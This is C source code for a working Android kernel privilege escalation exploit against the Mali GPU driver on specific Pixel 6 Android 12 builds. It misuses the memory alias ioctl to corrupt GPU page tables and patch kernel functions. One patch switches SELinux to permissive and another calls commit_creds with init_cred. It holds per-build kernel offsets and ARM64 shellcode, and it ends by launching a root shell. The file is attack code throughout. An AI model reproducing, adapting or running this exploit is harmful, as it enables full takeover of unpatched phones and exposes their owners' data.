#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/system_properties.h>

#include "stdbool.h"

#include "mali.h"
#include "mali_base_jm_kernel.h"
#include "midgard.h"

#define MALI "/dev/mali0"

#define PAGE_SHIFT 12

#define BASE_MEM_ALIAS_MAX_ENTS ((size_t)24576)

#define PFN_DOWN(x)	((x) >> PAGE_SHIFT)

#define POOL_SIZE 16384

#define RESERVED_SIZE 32

#define TOTAL_RESERVED_SIZE 1024

#define KERNEL_BASE 0x80000000

#define OVERWRITE_INDEX 256

#define ADRP_INIT_INDEX 0

#define ADD_INIT_INDEX 1

#define ADRP_COMMIT_INDEX 2

#define ADD_COMMIT_INDEX 3

#define AVC_DENY_2108 0x92df1c

#define SEL_READ_ENFORCE_2108 0x942ae4

#define INIT_CRED_2108 0x29a0570

#define COMMIT_CREDS_2108 0x180b0c

#define ADD_INIT_2108 0x9115c000

#define ADD_COMMIT_2108 0x912c3108

#define AVC_DENY_2201 0x930af4

#define SEL_READ_ENFORCE_2201 0x9456bc

#define INIT_CRED_2201 0x29b0570

#define COMMIT_CREDS_2201 0x183df0

#define ADD_INIT_2201 0x9115c000

#define ADD_COMMIT_2201 0x9137c108

#define AVC_DENY_2202 0x930b50

#define SEL_READ_ENFORCE_2202 0x94551c

#define INIT_CRED_2202 0x29b0570

#define COMMIT_CREDS_2202 0x183e3c

#define ADD_INIT_2202 0x9115c000    //add	x0, x0, #0x570

#define ADD_COMMIT_2202 0x9138f108  //add	x8, x8, #0xe3c

static uint64_t sel_read_enforce = SEL_READ_ENFORCE_2108;

static uint64_t avc_deny = AVC_DENY_2108;

static int atom_number = 1;

/*
Overwriting SELinux to permissive
  strb wzr, [x0]
  mov x0, #0
  ret
*/
static uint32_t permissive[3] = {0x3900001f, 0xd2800000,0xd65f03c0};

static uint32_t root_code[8] = {0};

struct base_mem_handle {
	struct {
		__u64 handle;
	} basep;
};

struct base_mem_aliasing_info {
	struct base_mem_handle handle;
	__u64 offset;
	__u64 length;
};

static int open_dev(char* name) {
  int fd = open(name, O_RDWR);
  if (fd == -1) {
    err(1, "cannot open %s\n", name);
  }
  return fd;
}

void setup_mali(int fd) {
  struct kbase_ioctl_version_check param = {0};
  if (ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &param) < 0) {
    err(1, "version check failed\n");
  }
  struct kbase_ioctl_set_flags set_flags = {1 << 3};
  if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &set_flags) < 0) {
    err(1, "set flags failed\n");
  }
}

void* setup_tracking_page(int fd) {
  void* region = mmap(NULL, 0x1000, 0, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);
  if (region == MAP_FAILED) {
    err(1, "setup tracking page failed");
  }
  return region;
}

void mem_alloc(int fd, union kbase_ioctl_mem_alloc* alloc) {
  if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, alloc) < 0) {
    err(1, "mem_alloc failed\n");
  }
}

void mem_alias(int fd, union kbase_ioctl_mem_alias* alias) {
  if (ioctl(fd, KBASE_IOCTL_MEM_ALIAS, alias) < 0) {
    err(1, "mem_alias failed\n");
  }
}

void mem_query(int fd, union kbase_ioctl_mem_query* query) {
  if (ioctl(fd, KBASE_IOCTL_MEM_QUERY, query) < 0) {
    err(1, "mem_query failed\n");
  }
}

uint32_t lo32(uint64_t x) {
  return x & 0xffffffff;
}

uint32_t hi32(uint64_t x) {
  return x >> 32;
}

uint32_t write_adrp(int rd, uint64_t pc, uint64_t label) {
  uint64_t pc_page = pc >> 12;
  uint64_t label_page = label >> 12;
  int64_t offset = (label_page - pc_page) << 12;
  int64_t immhi_mask = 0xffffe0;
  int64_t immhi = offset >> 14;
  int32_t immlo = (offset >> 12) & 0x3;
  uint32_t adpr = rd & 0x1f;
  adpr |= (1 << 28);
  adpr |= (1 << 31); //op
  adpr |= immlo << 29;
  adpr |= (immhi_mask & (immhi << 5));
  return adpr;
}

void fixup_root_shell(uint64_t init_cred, uint64_t commit_cred, uint64_t read_enforce, uint32_t add_init, uint32_t add_commit) {

  uint32_t init_adpr = write_adrp(0, read_enforce, init_cred);
  //Sets x0 to init_cred
  root_code[ADRP_INIT_INDEX] = init_adpr;
  root_code[ADD_INIT_INDEX] = add_init;
  //Sets x8 to commit_creds
  root_code[ADRP_COMMIT_INDEX] = write_adrp(8, read_enforce, commit_cred);
  root_code[ADD_COMMIT_INDEX] = add_commit;
  root_code[4] = 0xa9bf7bfd; // stp x29, x30, [sp, #-0x10]
  root_code[5] = 0xd63f0100; // blr x8
  root_code[6] = 0xa8c17bfd; // ldp x29, x30, [sp], #0x10
  root_code[7] = 0xd65f03c0; // ret
}

uint64_t get_gpuprop(int fd, uint32_t key) {
  struct kbase_ioctl_get_gpuprops props = {0};
  uint8_t buffer[0x1000] = {0};
  props.buffer = (uint64_t)(&(buffer[0]));
  props.size = 0x1000;
  if (ioctl(fd, KBASE_IOCTL_GET_GPUPROPS, &props) < 0) {
    err(1, "get_gpuprop failed\n");
  }
  int idx = 0;
  while (idx < 0x1000) {
    uint32_t this_key = *(uint32_t*)(&(buffer[idx]));
    uint32_t size_code = this_key & 0x3;
    this_key = this_key >> 2;
    uint64_t value;
    idx += 4;
    switch (size_code) {
      case 0:
        value = buffer[idx];
        idx++;
        break;
      case 1:
        value = *(uint16_t*)(&(buffer[idx]));
        idx += 2;
        break;
      case 2:
        value = *(uint32_t*)(&(buffer[idx]));
        idx += 4;
        break;
      case 3:
        value = *(uint64_t*)(&(buffer[idx]));
        idx += 8;
        break;
    }
    if (key == this_key) return value;
  }
  err(1, "cannot find prop\n");
  return -1;
}

void* map_gpu(int mali_fd, unsigned int pages, bool read_only, int group) {
  union kbase_ioctl_mem_alloc alloc = {0};
  alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | (group << 22);
  int prot = PROT_READ | PROT_WRITE;
  if (!read_only) {
    alloc.in.flags |= BASE_MEM_PROT_GPU_WR;
    prot |= PROT_WRITE;
  }
  alloc.in.va_pages = pages;
  alloc.in.commit_pages = pages;
  mem_alloc(mali_fd, &alloc);
  void* region = mmap(NULL, 0x1000 * pages, prot, MAP_SHARED, mali_fd, alloc.out.gpu_va);
  if (region == MAP_FAILED) {
    err(1, "mmap failed");
  }
  return region;
}

void write_to(int mali_fd, uint64_t gpu_addr, uint64_t value, int atom_number, enum mali_write_value_type type) {
  void* jc_region = map_gpu(mali_fd, 1, false, 0);
  struct MALI_JOB_HEADER jh = {0};
  jh.is_64b = true;
  jh.type = MALI_JOB_TYPE_WRITE_VALUE;
  
  struct MALI_WRITE_VALUE_JOB_PAYLOAD payload = {0};
  payload.type = type;
  payload.immediate_value = value;
  payload.address = gpu_addr;

  MALI_JOB_HEADER_pack((uint32_t*)jc_region, &jh);
  MALI_WRITE_VALUE_JOB_PAYLOAD_pack((uint32_t*)jc_region + 8, &payload);
  uint32_t* section = (uint32_t*)jc_region;
  struct base_jd_atom_v2 atom = {0};
  atom.jc = (uint64_t)jc_region;
  atom.atom_number = atom_number;
  atom.core_req = BASE_JD_REQ_CS;
  struct kbase_ioctl_job_submit submit = {0};
  submit.addr = (uint64_t)(&atom);
  submit.nr_atoms = 1;
  submit.stride = sizeof(struct base_jd_atom_v2);
  if (ioctl(mali_fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0) {
    err(1, "submit job failed\n");
  }
  usleep(10000);
}

void* drain_mem_pool(int mali_fd) {
  return map_gpu(mali_fd, POOL_SIZE, false, 1);
}

void release_mem_pool(void* drain) {
  munmap(drain, POOL_SIZE * 0x1000);
}

void reserve_pages(int mali_fd, int pages, int nents, uint64_t* reserved_va) {
  for (int i = 0; i < nents; i++) {
    union kbase_ioctl_mem_alloc alloc = {0};
    alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR | (1 << 22);
    int prot = PROT_READ | PROT_WRITE;
    alloc.in.va_pages = pages;
    alloc.in.commit_pages = pages;
    mem_alloc(mali_fd, &alloc);
    reserved_va[i] = alloc.out.gpu_va;
  }
}

void map_reserved(int mali_fd, int pages, int nents, uint64_t* reserved_va) {
  for (int i = 0; i < nents; i++) {
    void* reserved = mmap(NULL, 0x1000 * pages, PROT_READ | PROT_WRITE, MAP_SHARED, mali_fd, reserved_va[i]);
    if (reserved == MAP_FAILED) {
      err(1, "mmap reserved failed");
    }
    reserved_va[i] = (uint64_t)reserved;
  }
}

uint64_t set_addr_lv3(uint64_t addr) {
  uint64_t pfn = addr >> PAGE_SHIFT;
  pfn &= ~ 0x1FFUL;
  pfn |= 0x100UL;
  return pfn << PAGE_SHIFT;
}

static inline uint64_t compute_pt_index(uint64_t addr, int level) {
  uint64_t vpfn = addr >> PAGE_SHIFT;
  vpfn >>= (3 - level) * 9;
  return vpfn & 0x1FF;
}

void write_state(int mali_fd, uint64_t func, uint64_t* reserved, uint64_t size, uint32_t* shellcode, uint64_t code_size) {
  uint64_t func_offset = (func + KERNEL_BASE) % 0x1000;
  uint64_t curr_overwrite_addr = 0;
  for (int i = 0; i < size; i++) {
    uint64_t base = reserved[i];
    uint64_t end = reserved[i] + RESERVED_SIZE * 0x1000;
    uint64_t start_idx = compute_pt_index(base, 3);
    uint64_t end_idx = compute_pt_index(end, 3);
    for (uint64_t addr = base; addr < end; addr += 0x1000) {
      uint64_t overwrite_addr = set_addr_lv3(addr);
      if (curr_overwrite_addr != overwrite_addr) {
        printf("overwrite addr : %lx %lx\n", overwrite_addr + func_offset, func_offset);
        curr_overwrite_addr = overwrite_addr;
        write_to(mali_fd, overwrite_addr + func_offset, 0, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_8);
        usleep(300000);
      }
    }
  }
}


void write_func(int mali_fd, uint64_t func, uint64_t* reserved, uint64_t size, uint32_t* shellcode, uint64_t code_size) {
  uint64_t func_offset = (func + KERNEL_BASE) % 0x1000;
  uint64_t curr_overwrite_addr = 0;
  for (int i = 0; i < size; i++) {
    uint64_t base = reserved[i];
    uint64_t end = reserved[i] + RESERVED_SIZE * 0x1000;
    uint64_t start_idx = compute_pt_index(base, 3);
    uint64_t end_idx = compute_pt_index(end, 3);
    for (uint64_t addr = base; addr < end; addr += 0x1000) {
      uint64_t overwrite_addr = set_addr_lv3(addr);
      if (curr_overwrite_addr != overwrite_addr) {
        printf("overwrite addr : %lx %lx\n", overwrite_addr + func_offset, func_offset);
        curr_overwrite_addr = overwrite_addr;
        for (int code = code_size - 1; code >= 0; code--) {
          write_to(mali_fd, overwrite_addr + func_offset + code * 4, shellcode[code], atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_32);
        }
        usleep(300000);
      }
    }
  }
}

int run_enforce() {
  char result = '2';
  sleep(3);
  int enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY);
  read(enforce_fd, &result, 1);
  close(enforce_fd);
  printf("result %d\n", result);
  return result;
}

void select_offset() {
  char fingerprint[256];
  int len = __system_property_get("ro.build.fingerprint", fingerprint);
  printf("fingerprint: %s\n", fingerprint);
  if (!strcmp(fingerprint, "google/oriole/oriole:12/SD1A.210817.037/7862242:user/release-keys")) {
    avc_deny = AVC_DENY_2108;
    sel_read_enforce = SEL_READ_ENFORCE_2108;
    fixup_root_shell(INIT_CRED_2108, COMMIT_CREDS_2108, SEL_READ_ENFORCE_2108, ADD_INIT_2108, ADD_COMMIT_2108);
    return;
  }
  if (!strcmp(fingerprint, "google/oriole/oriole:12/SQ1D.220105.007/8030436:user/release-keys")) {
    avc_deny = AVC_DENY_2201;
    sel_read_enforce = SEL_READ_ENFORCE_2201;
    fixup_root_shell(INIT_CRED_2201, COMMIT_CREDS_2201, SEL_READ_ENFORCE_2201, ADD_INIT_2201, ADD_COMMIT_2201);
    return;
  }
  if (!strcmp(fingerprint, "google/oriole/oriole:12/SQ1D.220205.004/8151327:user/release-keys")) {
    avc_deny = AVC_DENY_2202;
    sel_read_enforce = SEL_READ_ENFORCE_2202;
    fixup_root_shell(INIT_CRED_2202, COMMIT_CREDS_2202, SEL_READ_ENFORCE_2202, ADD_INIT_2202, ADD_COMMIT_2202);
    return;
  }
  err(1, "unable to match build id\n");
}

//Clean up pagetable
void cleanup(int mali_fd, uint64_t gpu_va, uint64_t* reserved, size_t reserved_size) {
  for (int i = 0; i < 2; i++) {
    write_to(mali_fd, gpu_va + i * 0x1000 + OVERWRITE_INDEX * sizeof(uint64_t), 2, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
  }
}

int run_exploit() {
  int mali_fd = open_dev(MALI);
  uint64_t gpu_va[3] = {0};
  uint64_t reserved[TOTAL_RESERVED_SIZE/RESERVED_SIZE];

  setup_mali(mali_fd);

  void* tracking_page = setup_tracking_page(mali_fd);
  printf("tracking page %p\n", tracking_page);

  //Allocate enough pages so the page free'd later will spill into the device pool
  void* drain = drain_mem_pool(mali_fd);
  printf("drain %p\n", drain);

  //Regions for triggering the bug
  for (int i = 0; i < 2; i++) {
    void* region = map_gpu(mali_fd, 3, false, 1);
    gpu_va[i] = (uint64_t)region;
  }

  union kbase_ioctl_mem_alias alias = {0};
  alias.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;
  alias.in.stride = 9223372036854775808ull + 1;

  alias.in.nents = 2;
  struct base_mem_aliasing_info ai[2];
  ai[0].handle.basep.handle = gpu_va[0];
  ai[1].handle.basep.handle = gpu_va[0];
  ai[0].length = 0x3;
  ai[1].length = 0x3;
  ai[0].offset = 0;
  ai[1].offset = 0;
  alias.in.aliasing_info = (uint64_t)(&(ai[0]));
  mem_alias(mali_fd, &alias);
  void* region = mmap(NULL, 0x2000, PROT_READ, MAP_SHARED, mali_fd, alias.out.gpu_va);
  if (region == MAP_FAILED) {
    err(1, "mmap failed");
  }

  //allocate pages before we free the ones in allocated in drain, so that these won't be allocated from the device pool
  reserve_pages(mali_fd, RESERVED_SIZE, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(reserved[0]));

  printf("gpu_va[0] %lx\n", gpu_va[0]);
  printf("gpu_va[1] %lx\n", gpu_va[1]);
  printf("alias %p\n", region);
  munmap(region, 0x2000);
  //Free pages allocated in drain to fill the context pool. Now the context pool is full and subsequent free will return the pages to the device pool
  release_mem_pool(drain);

  //Free the doubling mapped page, the free'd pages will return to the device pool, some of which we will continue to hold a reference at gpu_va[1]
  munmap((void*)(gpu_va[0]), 0x3000);

  //Map the pages reserved earlier, the size will ensure that 2 new pgd at level 3 are needed, which will be allocated from the device pool (2 pages) One of
  //these pages will be doubly mapped to gpu_va[1] + 0x1000
  map_reserved(mali_fd, RESERVED_SIZE, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(reserved[0]));
  uint64_t avc_deny_addr = (((avc_deny + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT)| 0x443;
  //Writing to gpu_va[1] will now overwrite the level 3 pgd in one of the reserved pages mapped earlier.
  for (int i = 0; i < 2; i++) {
    write_to(mali_fd, gpu_va[1] + i * 0x1000 + OVERWRITE_INDEX * sizeof(uint64_t), avc_deny_addr, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
  }

  usleep(100000);
  //Go through the reserve pages addresses to write to sel_read_enforce with our own shellcode
  write_func(mali_fd, avc_deny, &(reserved[0]), TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(permissive[0]), sizeof(permissive)/sizeof(uint32_t));

  //Triggers avc_deny to disable SELinux
  open("/dev/kmsg", O_RDONLY);

  uint64_t sel_read_enforce_addr = (((sel_read_enforce + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT)| 0x443;
  //Writing to gpu_va[1] will now overwrite the level 3 pgd in one of the reserved pages mapped earlier.
  for (int i = 0; i < 2; i++) {
    write_to(mali_fd, gpu_va[1] + i * 0x1000 + OVERWRITE_INDEX * sizeof(uint64_t), sel_read_enforce_addr, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
  }

  //Call commit_creds to overwrite process credentials to gain root
  write_func(mali_fd, sel_read_enforce, &(reserved[0]), TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(root_code[0]), sizeof(root_code)/sizeof(uint32_t));

  run_enforce();

  cleanup(mali_fd, gpu_va[1], &(reserved[0]), TOTAL_RESERVED_SIZE/RESERVED_SIZE);
  usleep(100000);

  return 0;
}

int main() {
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
  
  select_offset();

  int ret = -1;
  sleep(1);
  ret = run_exploit();
  if (!ret) system("sh");
}
